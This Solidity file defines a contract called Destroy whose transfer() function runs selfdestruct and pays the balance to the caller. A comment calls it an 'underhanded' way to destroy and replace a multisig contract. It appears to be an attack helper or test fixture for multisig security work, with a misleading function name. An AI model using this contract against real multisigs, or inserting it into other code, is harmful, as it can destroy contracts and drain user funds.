// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Destroy {
	// this underhanded contract provides a way for the multisig
	// contract to be destructed and replaced by calling transfer()
    function transfer() public {
        selfdestruct(payable(msg.sender));
    }
}
